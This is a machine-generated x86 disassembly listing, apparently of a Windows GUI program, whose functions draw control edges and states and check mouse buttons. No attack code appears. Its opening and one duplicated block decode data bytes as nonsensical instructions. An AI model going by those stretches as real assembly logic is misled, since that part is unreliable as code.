mov ah 0x49
inc edi
add al bl
mov al 0x44
add al dl
test [ ebx ] dh
mov eax eax
[ eax ] ecx
pop es
adc eax 0x53505854
je r-xdata
fmul [ ebx + 0x3451e8c3 ]
dec ecx
je r-xdata
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
insb
push esp
outsd
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
je r-xdata
call sub_47502c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
insd
mov eax eax
js r-xdata
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ ecx + ecx * 2 ] cl
inc edi
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 + 0x34440044 ] cl
inc edi
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x7abfffbc ] ch
inc esp
add [ edx * 4 + 0x4aec0044 ] cl
inc edi
add [ ecx + edx * 2 + 0x54300047 ] ah
inc edi
add [ eax ] bh
add eax 0x5780048
dec eax
add [ ecx + eax ] cl
dec eax
add [ eax + 0x60004839 ] bl
inc edi
add ah ah
aaa
dec eax
add ah dh
aas
dec eax
add [ eax ] al
push edx
inc edi
add [ esi + edi - 0x2c7ffb8 ] cl
inc edi
add [ ebp + eax - 0x6efffb8 ] ah
inc edi
add [ eax + 0x53f80048 ] ah
inc edi
add [ eax ] ah
inc [ edi ]
dec eax
add [ eax ] cl
adc al 0x4e
inc edi
add [ edi + esi + 0x4c340048 ] ch
inc edi
add ah bh
push ecx
inc edi
add [ edx + ecx * 2 ] al
inc edi
add [ eax ] bl
inc ecx
dec eax
add [ 0x53505854 ] dl
je r-xdata
lea eax [ ecx ]
mov al [ 0x540044b0 ]
test [ eax + eax - 0x40 ] al
call 0xffffffff8c486224
0x46
mov edx [ ebx + 0x4c ]
mov edx 0x3
mov eax ebx
dec eax
add [ eax ] ch
clc
dec eax
add [ edi ] al
adc eax 0x53505854
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea esi [ ebx + 0x190 ]
mov eax ebx
call sub_4804d0
test al al
jne r-xdata
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc [ esp + 0x4 ]
mov esi esp
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
insb
jae r-xdata
add edx 0x2
mov eax ebx
call sub_448764
dec esp
insb
inc ecx
push edx
insd
outsd
jbe r-xdata
add [ eax + 0x49e8026a ] dl
dec ebx
clc
dec [ edi ]
mov edi 0x80c4f6c0
jne r-xdata
call sub_448764
jmp r-xdata
dec ecx
je r-xdata
mov al 0x1
retn
push 0x1
call GetAsyncKeyState
movsx eax ax
test ah 0x80
jne r-xdata
cld
inc esi
add [ ebx ] cl
add [ ebx ] cl
pop eax
push eax
inc ecx
arpl [ esi + ebp * 2 + 0x43 ] si
je r-xdata
insd
insb
sbb cl [ eax ]
sub al bh
xor eax eax
retn
sub_481a24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
adc al 0x42
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
mov ah 0x49
inc edi
add al bl
mov al 0x44
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ ecx + ecx * 2 ] cl
inc edi
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 + 0x34440044 ] cl
inc edi
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x7abfffbc ] ch
inc esp
add [ edx * 4 + 0x4aec0044 ] cl
inc edi
add [ ecx + edx * 2 + 0x54300047 ] ah
inc edi
add [ eax ] bh
add eax 0x5780048
dec eax
add [ ecx + eax ] cl
dec eax
add [ eax + 0x60004839 ] bl
inc edi
add ah ah
aaa
dec eax
add ah dh
aas
dec eax
add [ eax ] al
push edx
inc edi
add [ esi + edi - 0x2c7ffb8 ] cl
inc edi
add [ ebp + eax - 0x6efffb8 ] ah
inc edi
add [ eax + 0x53f80048 ] ah
inc edi
add [ eax ] ah
inc [ edi ]
dec eax
add [ eax ] cl
adc al 0x4e
inc edi
add [ edi + esi + 0x4c340048 ] ch
inc edi
add ah bh
push ecx
inc edi
add [ edx + ecx * 2 ] al
inc edi
add [ eax ] bl
inc ecx
dec eax
add [ 0x53505854 ] dl
je r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx + 0x48 ] bl
add al dl
add [ eax ] eax
add ah cl
test [ esi ] 0xbc
retn
insb
inc ecx
push edx
insd
outsd
jbe r-xdata
fmul [ ebx + 0x3451e8c3 ]
dec ecx
je r-xdata
call sub_47502c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
insd
mov eax eax
js r-xdata
mov edx [ ebx + 0x4c ]
mov edx 0x3
mov eax ebx
dec eax
add [ eax ] ch
clc
dec eax
add [ edi ] al
adc eax 0x53505854
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea esi [ ebx + 0x190 ]
mov eax ebx
call sub_4804d0
test al al
jne r-xdata
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc [ esp + 0x4 ]
mov esi esp
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
insb
jae r-xdata
add edx 0x2
mov eax ebx
call sub_448764
dec esp
insb
inc ecx
push edx
insd
outsd
jbe r-xdata
add [ eax + 0x49e8026a ] dl
dec ebx
clc
dec [ edi ]
mov edi 0x80c4f6c0
jne r-xdata
call sub_448764
jmp r-xdata
dec ecx
je r-xdata
mov al 0x1
retn
push 0x1
call GetAsyncKeyState
movsx eax ax
test ah 0x80
jne r-xdata
cld
inc esi
add [ ebx ] cl
add [ ebx ] cl
pop eax
push eax
inc ecx
arpl [ esi + ebp * 2 + 0x43 ] si
je r-xdata
insd
insb
sbb cl [ eax ]
sub al bh
xor eax eax
retn
sub_481ba8
push 0x2
call GetAsyncKeyState
movsx eax ax
test ah 0x80
jne r-xdata
mov al 0x1
retn
push 0x1
call GetAsyncKeyState
movsx eax ax
test ah 0x80
jne r-xdata
xor eax eax
retn
sub_481bcc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47502c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov edx [ ebx + 0x4c ]
add edx 0x2
mov eax ebx
call sub_448764
mov edx 0x3
mov eax ebx
call sub_448764
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea esi [ ebx + 0x190 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc [ esp + 0x4 ]
mov esi esp
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_4804d0
test al al
jne r-xdata
sub_481c34
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4751a4
mov ecx esp
mov edx [ ebx + 0x176 ]
inc edx
mov eax [ ebx + 0x172 ]
call sub_417088
mov eax [ esp ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x176 ] eax
pop ecx
pop edx
pop ebx
retn
sub_481c6c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x24 ]
cmp edx 0x20000000
je r-xdata
push esi
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ ebx + 0x172 ]
mov eax [ ebx + 0x190 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
push esi
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
cmp edx eax
jge r-xdata
xor ecx ecx
mov [ esp + 0x10 ] ecx
mov eax [ ebx + 0x198 ]
add eax 0x3
mov [ esp + 0x8 ] eax
sub eax 0x3
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax ebx
call sub_48060c
call sub_47ea90
call sub_47bc78
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax 0x19
mov [ esp + 0x8 ] eax
sub eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x16c ]
call sub_47b8c0
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_424e6c
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_47f0c0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
jne r-xdata
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
dec [ esi + 0x8 ]
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424e6c
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
inc [ esi + 0x8 ]
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424ea8
sub_481e50
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x16c ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax esi
call sub_47b214
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_4170c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425028
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x58 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
add [ ebp - 0x14 ] 0x2
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47f1d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
push 0x1
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
add edx 0x3
mov eax [ ebx ]
add eax 0x6
call sub_417088
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx 0x2
call sub_46b4ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_4170c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424e6c
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425028
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b214
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_482242
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_479c90
call sub_479044
mov ebx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b0a8
cmp [ eax + 0x5c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_424a38
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov ecx [ ebp - 0x18 ]
mov eax ebx
call sub_456bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b0a8
mov eax [ eax + 0x5c ]
mov ebx [ eax + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov eax [ eax + 0x68 ]
mov edx 0xffffffce
call sub_46b1b8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov edx [ ebx + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0x2
push eax
mov eax [ ebp - 0x14 ]
add eax 0x3
push eax
push 0x0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425280
push eax
call DrawStateA
test ebx ebx
je r-xdata
sub_482288
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424bd0
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424b88
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4823ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
call sub_424e6c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44894c
push 0x1
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawEdge
push 0x4
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawEdge
mov eax esi
call sub_47b8c0
test al al
je r-xdata
mov eax [ ebx + 0x160 ]
mov edx 0x20
call sub_424f44
mov eax ebx
call sub_4489f4
sar eax 0x1
jns r-xdata
adc ecx 0x0
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
push eax
mov eax ebx
call sub_4489b0
mov edx eax
mov eax [ ebx + 0x160 ]
pop ecx
call sub_424ee4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4823f3
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_403128
retn
adc eax 0x0
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424b54
jmp r-xdata
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax ebx
call sub_4489f4
mov ecx eax
sar ecx 0x1
jns r-xdata
sub_4823fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax [ ebp + 0x10 ]
call sub_404368
xor eax eax
push ebp
push sub_482463
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x6
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_475200
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48246a
lea eax [ ebp + 0x10 ]
call sub_403eb8
retn
sub_482474
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_474a04
mov esi [ ebx + 0x160 ]
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ esi + 0x10 ]
call sub_424758
mov eax [ esi + 0x10 ]
call sub_424750
mov edx eax
mov eax [ esi + 0x14 ]
call sub_424a38
push 0x3
lea ecx [ esp + 0x4 ]
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
sub edx 0x3
mov eax [ ebx + 0x48 ]
sub eax 0xb
call sub_417088
lea ecx [ esp + 0x4 ]
mov dl 0x1
mov eax [ ebx + 0x160 ]
call sub_46b278
pop ecx
pop edx
pop esi
pop ebx
retn
adc edx 0x0
sub_4824e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push sub_482535
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x6
push esi
call OffsetRect
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_475314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48253c
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
sub_482548
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
call sub_475b18
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebx ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebx ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x160 ]
xor ecx ecx
xor edx edx
call sub_424fe0
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
call InflateRect
pop ebx
pop ebp
retn
sub_4825c0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
call sub_48060c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ab ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d324
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_482548
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_475b18
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424b54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor ecx ecx
xor edx edx
call sub_424fe0
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_44894c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448ac4
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x18 ]
call sub_44894c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_475b18
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_42bc74
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_475b18
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
push ebp
call sub_482548
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ebx [ ebp - 0xc ]
mov ecx ebx
mov edx 0x1
call sub_424f44
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx ebx
call sub_424ee4
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InflateRect
jmp r-xdata
sub_4827cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push sub_48281d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push esi
call OffsetRect
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_475a04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482824
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
sub_48282c
push ebx
push esi
test dl dl
je r-xdata
